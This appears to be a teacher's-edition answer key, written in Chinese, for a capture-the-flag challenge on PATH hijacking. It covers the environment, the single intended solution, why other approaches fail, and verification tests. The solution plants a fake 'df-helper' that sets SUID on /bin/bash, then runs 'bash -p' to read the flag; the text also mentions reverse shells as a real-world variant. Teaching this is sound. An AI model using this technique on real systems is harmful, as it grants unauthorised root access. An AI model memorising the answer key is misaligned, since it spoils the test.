# 第 4 题（教师版）：PATH 劫持

> **唯一提权面**：root 的 cron 任务执行 `/usr/local/bin/disk-report.sh`，脚本内 `export PATH=/home/player/bin:...`，
> 然后用**裸命令名** `df-helper` 调用工具——`/home/player/bin` 是 `player` 可写目录，所以 player 可以“占位”。
> **唯一解**：在 `/home/player/bin` 放一个 `df-helper`，让它把 `/bin/bash` 变 SUID，等 cron 执行后 `bash -p`。
> **已刻意堵死**：`disk-report.sh`、`/etc/cron.d/disk-report`、`/var/reports`、`/usr/local/lib` 全部不可写；
> 真正的 helper 在 `/usr/local/lib/df-helper.real`，但**只有它前面的 `/home/player/bin` 会被优先命中**。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/usr/local/bin/disk-report.sh` | `root:root 0755` | root cron 执行；`PATH=/home/player/bin:...`；调 `df-helper` |
| `/etc/cron.d/disk-report` | `root:root 0644` | `* * * * * root /usr/local/bin/disk-report.sh` |
| `/home/player/bin` | `player:player 0755` | **可写**，PATH 的第一段 |
| `/usr/local/lib/df-helper.real` | `root:root 0755` | 真 helper（藏在 PATH 后段目录里，但被前面的同名文件覆盖） |
| `/var/reports` | `root:root 0755` | 输出目录 |

## 二、唯一解

```bash
cat /usr/local/bin/disk-report.sh
# export PATH=/home/player/bin:/usr/local/lib:/usr/local/bin:/usr/bin:/bin
# df-helper                      <-- 裸命令名

cat > /home/player/bin/df-helper <<'EOF'
#!/bin/bash
chmod 4755 /bin/bash
EOF
chmod +x /home/player/bin/df-helper

# 等 1 分钟，验证报告确实生成：
ls -lt /var/reports | head -2

/bin/bash -p
id
cat /flag.txt
```

### 关键点讲解

- **PATH 从左到右**：`/home/player/bin` 排在 `/usr/local/lib` 前面，因此先命中玩家的 `df-helper`。
- 脚本是 root 调用的，所以 player 放的脚本**以 root 身份执行**。
- 真实攻击里这一步常被用来做“持久化 + 提权”一步到位（把植入写成 `chmod +s` 或反弹 shell）。
- 对照：**如果脚本写的是绝对路径 `/usr/local/lib/df-helper.real`，PATH 劫持就无效**——这是修复要点。

## 三、为什么只有这一条解

| 可能的其他思路 | 为什么失败 |
|---|---|
| 直接改 `disk-report.sh` | 0755 root 属主，不可写 |
| 改 `/etc/cron.d/disk-report` | 0644 root，不可写 |
| 往 `/var/reports` 放东西 | 755 root，不可写；即便可写也只是输出 |
| 覆盖 `/usr/local/lib/df-helper.real` | 目录 root 属主 755，不可写 |
| 把 `df-helper` 放进 PATH 其他可写段 | 其余段（`/usr/local/lib`、`/usr/local/bin`、`/usr/bin`、`/bin`）全部 root 属主 |

## 四、单解验证

```bash
# 正向
cat > /home/player/bin/df-helper <<'EOF'
#!/bin/bash
chmod 4755 /bin/bash
EOF
chmod +x /home/player/bin/df-helper
sleep 65
ls -l /bin/bash          # -rwsr-xr-x
/bin/bash -p -c 'id; cat /flag.txt'

# 负向
echo x >> /usr/local/bin/disk-report.sh     # Permission denied
echo x >> /etc/cron.d/disk-report           # Permission denied
touch /usr/local/lib/df-helper.real         # Permission denied
```
